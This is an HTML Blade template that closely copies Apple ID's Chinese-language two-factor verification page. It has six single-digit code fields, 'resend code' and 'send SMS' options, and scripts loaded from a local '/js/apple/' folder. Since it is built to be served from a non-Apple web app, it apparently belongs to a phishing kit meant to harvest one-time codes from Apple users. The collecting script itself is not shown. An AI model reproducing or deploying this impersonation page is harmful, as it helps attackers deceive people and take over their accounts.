<html dir="ltr" data-rtl="false" lang="zh" class="prefpane na-presentation">

    <head>
        <title></title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

        <link rel="stylesheet" href="{{ asset('/fonts/fontss.css') }}" type="text/css">

        <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
        <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/auth.css') }}">

        <style type="text/css"></style>
    </head>

    <body class="tk-body">
        <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.
        </div>
        <div aria-hidden="true"
             style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
        <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
            <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
                <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="inline"
                     data-isiebutnotedge="false">
                    <div id="step" class="si-step  ">
                        <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section"></logo>
                        <div id="stepEl" class="   ">
                            <hsa2 class="auth-v1" suppress-iforgot="{suppressIforgot}"
                                  skip-trust-browser-step="{skipTrustBrowserStep}">






                                <div class="hsa2">

                                    <verify-device {two-factor-verification-support-url}="twoFactorVerificationSupportUrl"
                                                   {recovery-available}="recoveryAvailable" suppress-iforgot="{suppressIforgot}">






                                        <div class="verify-device fade-in ">
                                            <div class="">
                                                <app-title>


                                                    <h1 tabindex="-1" class="si-container-title tk-callout  ">

                                                        双重认证

                                                    </h1>
                                                </app-title>
                                                <div class="sec-code-wrapper">
                                                    <security-code length="{codeLength}" split="true" type="tel"
                                                                   sr-context="请输入验证码。输入验证码后，页面会自动更新。" localised-digit="位"
                                                                   error-message="">
                                                        <div class="security-code">
                                                            <idms-error-wrapper {disable-all-errors}="hasErrorLabel"
                                                                                {^error-type}="errorType" popover-auto-close="false"
                                                                                {^idms-error-wrapper-classes}="idmsErrorWrapperClasses"
                                                                                {has-errors-and-focus}="hasErrorsAndFocus"
                                                                                {show-error}="hasErrorsAndFocus"
                                                                                {error-message}="errorMessage"
                                                                                {parent-container}="parentContainer"
                                                                                {(enable-showing-errors)}="enableShowingErrors"
                                                                                error-input-id="idms-input-error-1664858895032-1"
                                                                                anchor-element="#security-code-wrap-1664858895032-1">
                                                                <div class="" id="idms-error-wrapper-1664858895032-0">

                                                                    <div id="security-code-wrap-1664858895032-1"
                                                                         class="security-code-wrap security-code-6 split"
                                                                         localiseddigit="位">
                                                                        <div class="security-code-container force-ltr">
                                                                            <div class="field-wrap force-ltr form-textbox ">
                                                                                <input maxlength="1" autocorrect="off"
                                                                                       autocomplete="off" autocapitalize="off"
                                                                                       spellcheck="false" type="tel" id="char0"
                                                                                       class="form-control force-ltr form-textbox-input char-field"
                                                                                       aria-label="请输入验证码。输入验证码后，页面会自动更新。 位 1"
                                                                                       placeholder="" data-index="0">
                                                                            </div>
                                                                            <div class="field-wrap force-ltr form-textbox ">
                                                                                <input maxlength="1" autocorrect="off"
                                                                                       autocomplete="off" autocapitalize="off"
                                                                                       spellcheck="false" type="tel" id="char1"
                                                                                       class="form-control force-ltr form-textbox-input char-field"
                                                                                       aria-label="位 2" placeholder=""
                                                                                       data-index="1">
                                                                            </div>
                                                                            <div class="field-wrap force-ltr form-textbox ">
                                                                                <input maxlength="1" autocorrect="off"
                                                                                       autocomplete="off" autocapitalize="off"
                                                                                       spellcheck="false" type="tel" id="char2"
                                                                                       class="form-control force-ltr form-textbox-input char-field"
                                                                                       aria-label="位 3" placeholder=""
                                                                                       data-index="2">
                                                                            </div>
                                                                            <div class="field-wrap force-ltr form-textbox ">
                                                                                <input maxlength="1" autocorrect="off"
                                                                                       autocomplete="off" autocapitalize="off"
                                                                                       spellcheck="false" type="tel" id="char3"
                                                                                       class="form-control force-ltr form-textbox-input char-field"
                                                                                       aria-label="位 4" placeholder=""
                                                                                       data-index="3">
                                                                            </div>
                                                                            <div class="field-wrap force-ltr form-textbox ">
                                                                                <input maxlength="1" autocorrect="off"
                                                                                       autocomplete="off" autocapitalize="off"
                                                                                       spellcheck="false" type="tel" id="char4"
                                                                                       class="form-control force-ltr form-textbox-input char-field"
                                                                                       aria-label="位 5" placeholder=""
                                                                                       data-index="4">
                                                                            </div>
                                                                            <div class="field-wrap force-ltr form-textbox ">
                                                                                <input maxlength="1" autocorrect="off"
                                                                                       autocomplete="off" autocapitalize="off"
                                                                                       spellcheck="false" type="tel" id="char5"
                                                                                       class="form-control force-ltr form-textbox-input char-field"
                                                                                       aria-label="位 6" placeholder=""
                                                                                       data-index="5">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                </div>
                                                            </idms-error-wrapper>
                                                        </div>
                                                    </security-code>
                                                </div>

                                                <div class="pop-container error tk-subbody hide" tabindex="-1"
                                                     role="tooltip">
                                                    <div class="error pop-bottom">验证码不正确</div>
                                                </div>

                                                <div class="si-info">
                                                    <p>
                                                        一条包含验证码的信息已发送至你的设备。输入验证码以继续。
                                                    </p>
                                                </div>

                                                <div class="spinner-container verifying-code hide" id="verifying-code">
                                                    <div class="spinner" role="progressbar"
                                                         style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                        <div
                                                             style="position: absolute; top: 0px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-12;">
                                                            <div
                                                                 style="position: absolute; width: 3.5px; height: 0.75px; background: rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(3.75px, 0px); border-radius: 0px;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="verifying-code-text hide thin">
                                                    正在验证…
                                                </div>

                                                <button
                                                        class="button-link si-link ax-outline tk-subbody lite-theme-override"
                                                        id="no-trstd-device-pop" href="#" aria-haspopup="dialog"
                                                        aria-expanded="false">
                                                    没有收到验证码？
                                                </button>
                                            </div>

                                            <other-options-popover {(show-alternate-options)}="showAlternateOptions"
                                                                   anchor-element="#no-trstd-device-pop">
                                                <div class="other-options-popover-container hide" tabindex="-1"
                                                     role="dialog" aria-label="其他选项">

                                                    <div class="pop-container hsa2-no-code">
                                                        <div class="pop-bottom options">
                                                            <div class="t-row">
                                                                <div class="t-cell ">
                                                                    <div class="try-again show-pointer" id="try-again">
                                                                        <i aria-hidden="true"
                                                                           class="shared-icon no-flip icon_reload"></i>

                                                                        <div class="text">
                                                                            <button
                                                                                    class="si-link link ax-outline tk-subbody-headline"
                                                                                    id="try-again-link" href="#"
                                                                                    aria-describedby="tryAgainInfo">
                                                                                重新发送验证码
                                                                            </button>

                                                                            <p id="tryAgainInfo" class="tk-subbody">
                                                                                获取新验证码。
                                                                            </p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="t-cell">
                                                                    <div id="use-phone" class="use-phone show-pointer ">
                                                                        <i aria-hidden="true"
                                                                           class="shared-icon no-flip icon_SMS3"></i>

                                                                        <div class="text">
                                                                            <button
                                                                                    class="si-link link ax-outline tk-subbody-headline"
                                                                                    id="use-phone-link" href="#"
                                                                                    aria-describedby="usePhoneInfo">
                                                                                发送短信给我
                                                                            </button>

                                                                            <p id="usePhoneInfo" class="tk-subbody">
                                                                                获取一条包含代码的短信。
                                                                            </p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="t-cell">
                                                                    <div class="need-help show-pointer" id="need-help">
                                                                        <i aria-hidden="true"
                                                                           class="shared-icon no-flip icon_exclamation"></i>

                                                                        <div class="text">

                                                                            <a class="si-link link ax-outline tk-subbody-headline sk-icon sk-icon-after sk-icon-external"
                                                                               id="need-help-link"
                                                                               ($click)="accRecoveryClick(%event)"
                                                                               href="#">
                                                                                更多选项…<span class="sr-only">在新窗口中打开。</span>
                                                                            </a>


                                                                            <p id="useNeedHelpInfo" class="tk-subbody">
                                                                                请确认你的电话号码，以获得支持。
                                                                            </p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                </div>
                                            </other-options-popover>

                                        </div>


                                    </verify-device>



                                </div>


                            </hsa2>
                        </div>
                    </div>
                    <div id="stocking" style="display:none !important;"></div>










                </div>
                <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
                </idms-modal>
            </apple-auth>
        </div>


        <script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
        <script type="text/javascript" src="{{ asset('/js/apple/jquery.cookie.js') }}"></script>
        <script type="text/javascript" src="{{ asset('/js/apple/auth.js') }}"></script>

    </body>

</html>
